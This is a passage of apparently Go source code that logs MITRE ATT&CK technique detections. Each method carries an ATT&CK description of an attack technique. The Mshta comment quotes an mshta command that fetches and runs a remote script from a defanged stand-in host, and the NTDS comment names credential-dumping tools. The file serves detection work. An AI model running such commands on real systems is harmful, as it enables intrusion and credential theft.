logged onto the system, the adversary can then create a logon session for the
user using the LogonUser function. The function will return a copy of the new
session's access token and the adversary can use SetThreadToken to assign the
token to a thread.
*/
func (g *Session) ATTACKEntMakeandImpersonateToken(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1134.003").
        Msg("make and impersonate token")
}

/* ATTACKEntMaliciousFile Phases: execution

An adversary may rely upon a user opening a malicious file in order to gain
execution. Users may be subjected to social engineering to get them to open a
file that will lead to code execution. This user action will typically be
observed as follow-on behavior from Spearphishing Attachment. Adversaries may
use several types of files that require a user to execute them, including .doc,
.pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. Adversaries may employ
various forms of Masquerading on the file to increase the likelihood that a user
will open it. While Malicious File frequently occurs shortly after Initial
Access it may occur at other phases of an intrusion, such as when an adversary
places a file in a shared directory or on a user's desktop hoping that a user
will click on it. This activity may also be seen shortly after Internal
Spearphishing.
*/
func (g *Session) ATTACKEntMaliciousFile(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1204.002").
        Msg("malicious file")
}

/* ATTACKEntMaliciousImage Phases: execution

Adversaries may rely on a user running a malicious image to facilitate
execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud
Platform (GCP) Images, and Azure Images as well as popular container runtimes
such as Docker can be backdoored. Backdoored images may be uploaded to a public
repository via Upload Malware, and users may then download and deploy an
instance or container from the image without realizing the image is malicious,
thus bypassing techniques that specifically achieve Initial Access. This can
lead to the execution of malicious code, such as code that executes
cryptocurrency mining, in the instance or container.(Citation: Summit Route
Malicious AMIs) Adversaries may also name images a certain way to increase the
chance of users mistakenly deploying an instance or container from the image
(ex: Match Legitimate Name or Location).
*/
func (g *Session) ATTACKEntMaliciousImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1204.003").
        Msg("malicious image")
}

/* ATTACKEntMaliciousLink Phases: execution

An adversary may rely upon a user clicking a malicious link in order to gain
execution. Users may be subjected to social engineering to get them to click on
a link that will lead to code execution. This user action will typically be
observed as follow-on behavior from Spearphishing Link. Clicking on a link may
also lead to other execution techniques such as exploitation of a browser or
application vulnerability via Exploitation for Client Execution. Links may also
lead users to download files that require execution via Malicious File.
*/
func (g *Session) ATTACKEntMaliciousLink(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1204.001").
        Msg("malicious link")
}

/* ATTACKEntMalware Phases: resource-development

Adversaries may develop malware and malware components that can be used during
targeting. Building malicious software can include the development of payloads,
droppers, post-compromise tools, backdoors (including backdoored images),
packers, C2 protocols, and the creation of infected removable media. Adversaries
may develop malware to support their operations, creating a means for
maintaining control of remote machines, evading defenses, and executing post-
compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky
Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB) As with
legitimate development efforts, different skill sets may be required for
developing malware. The skills needed may be located in-house, or may need to be
contracted out. Use of a contractor may be considered an extension of that
adversary's malware development capabilities, provided the adversary plays a
role in shaping requirements and maintains a degree of exclusivity to the
malware. Some aspects of malware development, such as C2 protocol development,
may require adversaries to obtain additional infrastructure. For example,
malware developed that will communicate with Twitter for C2, may require use of
Web Services.(Citation: FireEye APT29)
*/
func (g *Session) ATTACKEntMalware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1587.001").
        Msg("malware")
}

/* ATTACKEntMalware2 Phases: resource-development

Adversaries may buy, steal, or download malware that can be used during
targeting. Malicious software can include payloads, droppers, post-compromise
tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to
support their operations, obtaining a means for maintaining control of remote
machines, evading defenses, and executing post-compromise behaviors. In addition
to downloading free malware from the internet, adversaries may purchase these
capabilities from third-party entities. Third-party entities can include
technology companies that specialize in malware development, criminal
marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In
addition to purchasing malware, adversaries may steal and repurpose malware from
third-party entities (including other adversaries).
*/
func (g *Session) ATTACKEntMalware2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588.001").
        Msg("malware")
}

/* ATTACKEntManintheBrowser Phases: collection

Adversaries can take advantage of security vulnerabilities and inherent
functionality in browser software to change content, modify behavior, and
intercept information as part of various man in the browser techniques.
(Citation: Wikipedia Man in the Browser) A specific example is when an adversary
injects software into a browser that allows an them to inherit cookies, HTTP
sessions, and SSL client certificates of a user and use the browser as a way to
pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot)
(Citation: ICEBRG Chrome Extensions) Browser pivoting requires the
SeDebugPrivilege and a high-integrity process to execute. Browser traffic is
pivoted from the adversary's browser through the user's browser by setting up an
HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter
the user's traffic in any way. The proxy connection is severed as soon as the
browser is closed. Whichever browser process the proxy is injected into, the
adversary assumes the security context of that process. Browsers typically
create a new process for each tab that is opened and permissions and
certificates are separated accordingly. With these permissions, an adversary
could browse to any resource on an intranet that is accessible through the
browser and which the browser has sufficient permissions, such as Sharepoint or
webmail. Browser pivoting also eliminates the security provided by 2-factor
authentication. (Citation: cobaltstrike manual)
*/
func (g *Session) ATTACKEntManintheBrowser(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1185").
        Msg("man in the browser")
}

/* ATTACKEntManintheMiddle Phases: credential-access collection

Adversaries may attempt to position themselves between two or more networked
devices using a man-in-the-middle (MiTM) technique to support follow-on
behaviors such as Network Sniffing or Transmitted Data Manipulation. By abusing
features of common networking protocols that can determine the flow of network
traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to
communicate through an adversary controlled system so they can collect
information or perform additional actions.(Citation: Rapid7 MiTM Basics)
Adversaries may leverage the MiTM position to attempt to modify traffic, such as
in Transmitted Data Manipulation. Adversaries can also stop traffic from flowing
to the appropriate destination, causing denial of service.
*/
func (g *Session) ATTACKEntManintheMiddle(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1557").
        Msg("man-in-the-middle")
}

/* ATTACKEntMarkoftheWebBypass Phases: defense-evasion

Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW)
controls. In Windows, when files are downloaded from the Internet, they are
tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with
a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020)
Files that are tagged with MOTW are protected and cannot perform certain
actions. For example, starting in MS Office 10, if a MS Office file has the
MOTW, it will open in Protected View. Executables tagged with the MOTW will be
processed by Windows Defender SmartScreen that compares files with an allowlist
of well-known executables. If the file in not known/trusted, SmartScreen will
prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD
Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)
Adversaries may abuse container files such as compressed/archive (.arj, .gzip)
and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that
may not be tagged with MOTW. Container files downloaded from the Internet will
be marked with MOTW but the files within may not inherit the MOTW after the
container files are extracted and/or mounted. MOTW is a NTFS feature and many
container files do not support NTFS alternative data streams. After a container
file is extracted and/or mounted, the files contained within them may be treated
as local files on disk and run without protections.(Citation: Beek Use of VHD
Dec 2020)(Citation: Outflank MotW 2020)
*/
func (g *Session) ATTACKEntMarkoftheWebBypass(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553.005").
        Msg("mark-of-the-web bypass")
}

/* ATTACKEntMasqueradeTaskorService Phases: defense-evasion

Adversaries may attempt to manipulate the name of a task or service to make it
appear legitimate or benign. Tasks/services executed by the Task Scheduler or
systemd will typically be given a name and/or description.(Citation: TechNet
Schtasks)(Citation: Systemd Service Units) Windows services will have a service
name as well as a display name. Many benign tasks and services exist that have
commonly associated names. Adversaries may give tasks or services names that are
similar or identical to those of legitimate ones. Tasks or services contain
other fields, such as a description, that adversaries may attempt to make appear
legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web
Analysis)
*/
func (g *Session) ATTACKEntMasqueradeTaskorService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036.004").
        Msg("masquerade task or service")
}

/* ATTACKEntMasquerading Phases: defense-evasion

Adversaries may attempt to manipulate features of their artifacts to make them
appear legitimate or benign to users and/or security tools. Masquerading occurs
when the name or location of an object, legitimate or malicious, is manipulated
or abused for the sake of evading defenses and observation. This may include
manipulating file metadata, tricking users into misidentifying the file type,
and giving legitimate task or service names. Renaming abusable system utilities
to evade security monitoring is also a form of Masquerading.(Citation: LOLBAS
Main Site)
*/
func (g *Session) ATTACKEntMasquerading(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036").
        Msg("masquerading")
}

/* ATTACKEntMatchLegitimateNameorLocation Phases: defense-evasion

Adversaries may match or approximate the name or location of legitimate files or
resources when naming/placing them. This is done for the sake of evading
defenses and observation. This may be done by placing an executable in a
commonly trusted directory (ex: under System32) or giving it the name of a
legitimate, trusted program (ex: svchost.exe). In containerized environments,
this may also be done by creating a resource in a namespace that matches the
naming convention of a container pod or cluster. Alternatively, a file or
container image name given may be a close approximation to legitimate
programs/images or something innocuous. Adversaries may also use the same icon
of the file they are trying to mimic.
*/
func (g *Session) ATTACKEntMatchLegitimateNameorLocation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036.005").
        Msg("match legitimate name or location")
}

/* ATTACKEntModifyAuthenticationProcess Phases: credential-access defense-evasion persistence

Adversaries may modify authentication mechanisms and processes to access user
credentials or enable otherwise unwarranted access to accounts. The
authentication process is handled by mechanisms, such as the Local Security
Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on
Windows, pluggable authentication modules (PAM) on Unix-based systems, and
authorization plugins on MacOS systems, responsible for gathering, storing, and
validating credentials. By modifying an authentication process, an adversary may
be able to authenticate to a service or system without using Valid Accounts.
Adversaries may maliciously modify a part of this process to either reveal
credentials or bypass authentication mechanisms. Compromised credentials or
access may be used to bypass access controls placed on various resources on
systems within the network and may even be used for persistent access to remote
systems and externally available services, such as VPNs, Outlook Web Access and
remote desktop.
*/
func (g *Session) ATTACKEntModifyAuthenticationProcess(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1556").
        Msg("modify authentication process")
}

/* ATTACKEntModifyCloudComputeInfrastructure Phases: defense-evasion

An adversary may attempt to modify a cloud account's compute service
infrastructure to evade defenses. A modification to the compute service
infrastructure can include the creation, deletion, or modification of one or
more components such as compute instances, virtual machines, and snapshots.
Permissions gained from the modification of infrastructure components may bypass
restrictions that prevent access to existing infrastructure. Modifying
infrastructure components may also allow an adversary to evade detection and
remove evidence of their presence.(Citation: Mandiant M-Trends 2020)
*/
func (g *Session) ATTACKEntModifyCloudComputeInfrastructure(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1578").
        Msg("modify cloud compute infrastructure")
}

/* ATTACKEntModifyRegistry Phases: defense-evasion

Adversaries may interact with the Windows Registry to hide configuration
information within Registry keys, remove information as part of cleaning up, or
as part of other techniques to aid in persistence and execution. Access to
specific areas of the Registry depends on account permissions, some requiring
administrator-level access. The built-in Windows command-line utility Reg may be
used for local or remote Registry modification. (Citation: Microsoft Reg) Other
tools may also be used, such as a remote access tool, which may contain
functionality to interact with the Registry through the Windows API. Registry
modifications may also include actions to hide keys, such as prepending key
names with a null character, which will cause an error and/or be ignored when
read via Reg or other utilities using the Win32 API. (Citation: Microsoft
Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal
payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS
AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017) The Registry of a remote
system may be modified to aid in execution of files as part of lateral movement.
It requires the remote Registry service to be running on the target system.
(Citation: Microsoft Remote) Often Valid Accounts are required, along with
access to the remote system's SMB/Windows Admin Shares for RPC communication.
*/
func (g *Session) ATTACKEntModifyRegistry(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1112").
        Msg("modify registry")
}

/* ATTACKEntModifySystemImage Phases: defense-evasion

Adversaries may make changes to the operating system of embedded network devices
to weaken defenses and provide new capabilities for themselves.  On such
devices, the operating systems are typically monolithic and most of the device
functionality and capabilities are contained within a single file. To change the
operating system, the adversary typically only needs to affect this one file,
replacing or modifying it.  This can either be done live in memory during system
runtime for immediate effect, or in storage to implement the change on the next
boot of the network device.
*/
func (g *Session) ATTACKEntModifySystemImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1601").
        Msg("modify system image")
}

/* ATTACKEntMshta Phases: defense-evasion

Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and
Javascript or VBScript through a trusted Windows utility. There are several
examples of different types of threats leveraging mshta.exe during initial
compromise and for execution of code (Citation: Cylance Dust Storm) (Citation:
Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA)
(Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)
Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.
(Citation: Wikipedia HTML Application) HTAs are standalone applications that
execute using the same models and technologies of Internet Explorer, but outside
of the browser. (Citation: MSDN HTML Applications) Files may be executed by
mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""sc
ript:https[:]//webserver/payload[.]sct"")")) They may also be executed directly
from URLs: mshta http[:]//webserver/payload[.]hta Mshta.exe can be used to
bypass application control solutions that do not account for its potential use.
Since mshta.exe executes outside of the Internet Explorer's security context, it
also bypasses browser security settings. (Citation: LOLBAS Mshta)
*/
func (g *Session) ATTACKEntMshta(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.005").
        Msg("mshta")
}

/* ATTACKEntMsiexec Phases: defense-evasion

Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus
commonly associated with executing installation packages (.msi).(Citation:
Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft. Adversaries may
abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe
can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec
Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be
used to bypass application control solutions that do not account for its
potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges
if the AlwaysInstallElevated policy is enabled.(Citation: Microsoft
AlwaysInstallElevated 2018)
*/
func (g *Session) ATTACKEntMsiexec(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.007").
        Msg("msiexec")
}

/* ATTACKEntMultiStageChannels Phases: command-and-control

Adversaries may create multiple stages for command and control that are employed
under different conditions or for certain functions. Use of multiple stages may
obfuscate the command and control channel to make detection more difficult.
Remote access tools will call back to the first-stage command and control server
for instructions. The first stage may have automated capabilities to collect
basic host information, update tools, and upload additional files. A second
remote access tool (RAT) could be uploaded at that point to redirect the host to
the second-stage command and control server. The second stage will likely be
more fully featured and allow the adversary to interact with the system through
a reverse shell and additional RAT features. The different stages will likely be
hosted separately with no overlapping infrastructure. The loader may also have
backup first-stage callbacks or Fallback Channels in case the original first-
stage communication path is discovered and blocked.
*/
func (g *Session) ATTACKEntMultiStageChannels(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1104").
        Msg("multi-stage channels")
}

/* ATTACKEntMultihopProxy Phases: command-and-control

To disguise the source of malicious traffic, adversaries may chain together
multiple proxies. Typically, a defender will be able to identify the last proxy
traffic traversed before it enters their network; the defender may or may not be
able to identify any previous proxies before the last-hop proxy. This technique
makes identifying the original source of the malicious traffic even more
difficult by requiring the defender to trace malicious traffic through several
proxies to identify its source. A particular variant of this behavior is to use
onion routing networks, such as the publicly available TOR network. (Citation:
Onion Routing) In the case of network infrastructure, particularly routers, it
is possible for an adversary to leverage multiple compromised devices to create
a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.
By leveraging Patch System Image, adversaries can add custom code to the
affected network devices that will implement onion routing between those nodes.
This custom onion routing network will transport the encrypted C2 traffic
through the compromised population, allowing adversaries to communicate with any
device within the onion routing network.  This method is dependent upon the
Network Boundary Bridging method in order to allow the adversaries to cross the
protected network boundary of the Internet perimeter and into the organization’s
WAN. Protocols such as ICMP may be used as a transport.
*/
func (g *Session) ATTACKEntMultihopProxy(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1090.003").
        Msg("multi-hop proxy")
}

/* ATTACKEntMultibandCommunication Phases: command-and-control

This technique has been deprecated and should no longer be used. Some
adversaries may split communications between different protocols. There could be
one protocol for inbound command and control and another for outbound data,
allowing it to bypass certain firewall restrictions. The split could also be
random to simply avoid data threshold alerts on any one communication.
*/
func (g *Session) ATTACKEntMultibandCommunication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1026").
        Msg("multiband communication")
}

/* ATTACKEntNTDS Phases: credential-access

Adversaries may attempt to access or create a copy of the Active Directory
domain database in order to steal credential information, as well as obtain
other information about domain members such as devices, users, and access
rights. By default, the NTDS file (NTDS.dit) is located in
%SystemRoot%\NTDS\Ntds.dit of a domain controller.(Citation: Wikipedia Active
Directory) In addition to looking for NTDS files on active Domain Controllers,
attackers may search for backups that contain the same or similar
information.(Citation: Metcalf 2015) The following tools and techniques can be
used to enumerate the NTDS file and the contents of the entire Active Directory
hashes.  Volume Shadow Copy secretsdump.py Using the in-built Windows tool,
ntdsutil.exe Invoke-NinjaCopy
*/
func (g *Session) ATTACKEntNTDS(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.003").
        Msg("ntds")
}

/* ATTACKEntNTFSFileAttributes Phases: defense-evasion

Adversaries may use NTFS file attributes to hide their malicious data in order
to evade detection. Every New Technology File System (NTFS) formatted partition
contains a Master File Table (MFT) that maintains a record for every
file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017)
Within MFT entries are file attributes, (Citation: Microsoft NTFS File
Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as
Alternate Data Streams (ADSs) when more than one Data attribute is present],
that can be used to store arbitrary data (and even complete files). (Citation:
SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation:
MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014) Adversaries may
store malicious data or binaries in file attribute metadata instead of directly
in files. This may be done to evade some defenses, such as static indicator
scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA)
(Citation: MalwareBytes ADS July 2015)
*/
func (g *Session) ATTACKEntNTFSFileAttributes(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.004").
        Msg("ntfs file attributes")
}

/* ATTACKEntNativeAPI Phases: execution

Adversaries may directly interact with the native OS application programming
interface (API) to execute behaviors. Native APIs provide a controlled means of
calling low-level OS services within the kernel, such as those involving
hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation:
Linux Kernel API) These native APIs are leveraged by the OS during system boot
(when other system components are not yet initialized) as well as carrying out
tasks and requests during routine operations. Functionality provided by native
APIs are often also exposed to user-mode applications via interfaces and
libraries. For example, functions such as the Windows API CreateProcess() or GNU
fork() will allow programs and scripts to start other processes.(Citation:
Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to
execute a binary, run a CLI command, load modules, etc. as thousands of similar
API functions exist for various system operations.(Citation: Microsoft
Win32)(Citation: LIBC)(Citation: GLIBC) Higher level software frameworks, such
as Microsoft .NET and macOS Cocoa, are also available to interact with native
APIs. These frameworks typically provide language wrappers/abstractions to API
functionalities and are designed for ease-of-use/portability of code.(Citation:
Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation:
macOS Foundation) Adversaries may abuse these native API functions as a means of
executing behaviors. Similar to Command and Scripting Interpreter, the native
API and its hierarchy of interfaces, provide mechanisms to interact with and
utilize various components of a victimized system.
*/
func (g *Session) ATTACKEntNativeAPI(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1106").
        Msg("native api")
}

/* ATTACKEntNetshHelperDLL Phases: privilege-escalation persistence

Adversaries may establish persistence by executing malicious content triggered
by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line
scripting utility used to interact with the network configuration of a system.
It contains functionality to add helper DLLs for extending functionality of the
utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs
are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.
Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code
in a persistent manner. This execution would take place anytime netsh.exe is
executed, which could happen automatically, with another persistence technique,
or if other software (ex: VPN) is present on the system that executes netsh.exe
as part of its normal functionality. (Citation: Github Netsh Helper CS
Beacon)(Citation: Demaske Netsh Persistence)
*/
func (g *Session) ATTACKEntNetshHelperDLL(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.007").
        Msg("netsh helper dll")
}

/* ATTACKEntNetworkAddressTranslationTraversal Phases: defense-evasion

Adversaries may bridge network boundaries by modifying a network device’s
Network Address Translation (NAT) configuration. Malicious modifications to NAT
may enable an adversary to bypass restrictions on traffic routing that otherwise
separate trusted and untrusted networks. Network devices such as routers and
firewalls that connect multiple networks together may implement NAT during the
process of passing packets between networks. When performing NAT, the network
device will rewrite the source and/or destination addresses of the IP address
header. Some network designs require NAT for the packets to cross the border
device.  A typical example of this is environments where internal networks make
use of non-Internet routable addresses.(Citation: RFC1918) When an adversary
gains control of a network boundary device, they can either leverage existing
NAT configurations to send traffic between two separated networks, or they can
implement NAT configurations of their own design.  In the case of network
designs that require NAT to function, this enables the adversary to overcome
inherent routing limitations that would normally prevent them from accessing
protected systems behind the border device.  In the case of network designs that
do not require NAT, address translation can be used by adversaries to obscure
their activities, as changing the addresses of packets that traverse a network
boundary device can make monitoring data transmissions more challenging for
defenders.   Adversaries may use Patch System Image to change the operating
system of a network device, implementing their own custom NAT mechanisms to
further obscure their activities
*/
func (g *Session) ATTACKEntNetworkAddressTranslationTraversal(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1599.001").
        Msg("network address translation traversal")
}

/* ATTACKEntNetworkBoundaryBridging Phases: defense-evasion

Adversaries may bridge network boundaries by compromising perimeter network
devices. Breaching these devices may enable an adversary to bypass restrictions
on traffic routing that otherwise separate trusted and untrusted networks.
Devices such as routers and firewalls can be used to create boundaries between
trusted and untrusted networks.  They achieve this by restricting traffic types
to enforce organizational policy in an attempt to reduce the risk inherent in
such connections.  Restriction of traffic can be achieved by prohibiting IP
addresses, layer 4 protocol ports, or through deep packet inspection to identify
applications.  To participate with the rest of the network, these devices can be
directly addressable or transparent, but their mode of operation has no bearing
on how the adversary can bypass them when compromised. When an adversary takes
control of such a boundary device, they can bypass its policy enforcement to
pass normally prohibited traffic across the trust boundary between the two
separated networks without hinderance.  By achieving sufficient rights on the
device, an adversary can reconfigure the device to allow the traffic they want,
allowing them to then further achieve goals such as command and control via
Multi-hop Proxy or exfiltration of data via Traffic Duplication.  In the cases
where a border device separates two separate organizations, the adversary can
also facilitate lateral movement into new victim environments.
*/
func (g *Session) ATTACKEntNetworkBoundaryBridging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1599").
        Msg("network boundary bridging")
}

/* ATTACKEntNetworkDenialofService Phases: impact

Adversaries may perform Network Denial of Service (DoS) attacks to degrade or
block the availability of targeted resources to users. Network DoS can be
performed by exhausting the network bandwidth services rely on. Example
resources include specific websites, email services, DNS, and web-based
applications. Adversaries have been observed conducting network DoS attacks for
political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to
support other malicious activities, including distraction(Citation: FSISAC
FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS
October 2014) A Network DoS will occur when the bandwidth capacity of the
network connection to a system is exhausted due to the volume of malicious
traffic directed at the resource or the network connections and network devices
the resource relies on. For example, an adversary may send 10Gbps of traffic to
a server that is hosted by a network with a 1Gbps connection to the internet.
This traffic can be generated by a single system or multiple systems spread
across the internet, which is commonly referred to as a distributed DoS (DDoS).
To perform Network DoS attacks several aspects apply to multiple methods,
including IP address spoofing, and botnets. Adversaries may use the original IP
address of an attacking system, or spoof the source IP address to make the
attack traffic more difficult to trace back to the attacking system or to enable
reflection. This can increase the difficulty defenders have in defending against
the attack by reducing or eliminating the effectiveness of filtering by the
source address on network defense devices. For DoS attacks targeting the hosting
system directly, see Endpoint Denial of Service.
*/
func (g *Session) ATTACKEntNetworkDenialofService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1498").
        Msg("network denial of service")
}

/* ATTACKEntNetworkDeviceAuthentication Phases: credential-access defense-evasion persistence

Adversaries may use Patch System Image to hard code a password in the operating
system, thus bypassing of native authentication mechanisms for local accounts on
network devices. Modify System Image may include implanted code to the operating
system for network devices to provide access for adversaries using a specific
password.  The modification includes a specific password which is implanted in
the operating system image via the patch.  Upon authentication attempts, the
inserted code will first check to see if the user input is the password. If so,
access is granted. Otherwise, the implanted code will pass the credentials on
for verification of potentially valid credentials.(Citation: FireEye - Synful
Knock)
*/
func (g *Session) ATTACKEntNetworkDeviceAuthentication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1556.004").
        Msg("network device authentication")
}

/* ATTACKEntNetworkDeviceCLI Phases: execution

Adversaries may abuse scripting or built-in command line interpreters (CLI) on
network devices to execute malicious command and payloads. The CLI is the
primary means through which users and administrators interact with the device in
order to view system information, modify device operations, or perform
diagnostic and administrative functions. CLIs typically contain various
permission levels required for different commands.  Scripting interpreters
automate tasks and extend functionality beyond the command set included in the
network OS. The CLI and scripting interpreter are accessible through a direct
console connection, or through remote means, such as telnet or secure shell
(SSH). Adversaries can use the network CLI to change how network devices behave
and operate. The CLI may be used to manipulate traffic flows to intercept or
manipulate data, modify startup configuration parameters to load malicious
system software, or to disable security features or logging to avoid detection.
(Citation: Cisco Synful Knock Evolution)
*/
func (g *Session) ATTACKEntNetworkDeviceCLI(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.008").
        Msg("network device cli")
}

/* ATTACKEntNetworkDeviceConfigurationDump Phases: collection

Adversaries may access network configuration files to collect sensitive data
about the device and the network. The network configuration is a file containing
parameters that determine the operation of the device. The device typically
stores an in-memory copy of the configuration while operating, and a separate
configuration on non-volatile storage to load after device reset. Adversaries
can inspect the configuration files to reveal information about the target
network and its layout, the network device and its software, or identifying
legitimate accounts and credentials for later use. Adversaries can use common
management tools and protocols, such as Simple Network Management Protocol
(SNMP) and Smart Install (SMI), to access network configuration files.
(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018) (Citation:
Cisco Blog Legacy Device Attacks) These tools may be used to query specific data
from a configuration repository or configure the device to export the
configuration for later analysis.
*/
func (g *Session) ATTACKEntNetworkDeviceConfigurationDump(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1602.002").
        Msg("network device configuration dump")
}

/* ATTACKEntNetworkLogonScript Phases: persistence privilege-escalation

Adversaries may use network logon scripts automatically executed at logon
initialization to establish persistence. Network logon scripts can be assigned
using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD)
These logon scripts run with the privileges of the user they are assigned to.
Depending on the systems within the network, initializing one of these scripts
could apply to more than one or potentially all systems.   Adversaries may use
these scripts to maintain persistence on a network. Depending on the access
configuration of the logon scripts, either local credentials or an administrator
account may be necessary.
*/
func (g *Session) ATTACKEntNetworkLogonScript(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1037.003").
        Msg("network logon script")
}

/* ATTACKEntNetworkSecurityAppliances Phases: reconnaissance

Adversaries may gather information about the victim's network security
appliances that can be used during targeting. Information about network security
appliances may include a variety of details, such as the existence and specifics
of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries
may also target information about victim network-based intrusion detection
systems (NIDS) or other appliances related to defensive cybersecurity
operations. Adversaries may gather this information in various ways, such as
direct collection actions via Active Scanning or Phishing for
Information.(Citation: Nmap Firewalls NIDS) Information about network security
appliances may also be exposed to adversaries via online or other accessible
data sets (ex: Search Victim-Owned Websites). Gathering this information may
reveal opportunities for other forms of reconnaissance (ex: Search Open
Technical Databases or Search Open Websites/Domains), establishing operational
resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial
access (ex: External Remote Services).
*/
func (g *Session) ATTACKEntNetworkSecurityAppliances(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590.006").
        Msg("network security appliances")
}

/* ATTACKEntNetworkServiceScanning Phases: discovery

Adversaries may attempt to get a listing of services running on remote hosts,
including those that may be vulnerable to remote software exploitation. Methods
to acquire this information include port scans and vulnerability scans using
tools that are brought onto a system.  Within cloud environments, adversaries
may attempt to discover services running on other cloud hosts. Additionally, if
the cloud environment is connected to a on-premises environment, adversaries may
be able to identify services running on non-cloud systems as well.
*/
func (g *Session) ATTACKEntNetworkServiceScanning(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1046").
        Msg("network service scanning")
}

/* ATTACKEntNetworkShareConnectionRemoval Phases: defense-evasion

Adversaries may remove share connections that are no longer useful in order to
clean up traces of their operation. Windows shared drive and SMB/Windows Admin
Shares connections can be removed when no longer needed. Net is an example
utility that can be used to remove network share connections with the net use
\system\share /delete command. (Citation: Technet Net Use)
*/
func (g *Session) ATTACKEntNetworkShareConnectionRemoval(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070.005").
        Msg("network share connection removal")
}

/* ATTACKEntNetworkShareDiscovery Phases: discovery

Adversaries may look for folders and drives shared on remote systems as a means
of identifying sources of information to gather as a precursor for Collection
and to identify potential systems of interest for Lateral Movement. Networks
often contain shared network drives and folders that enable users to access file
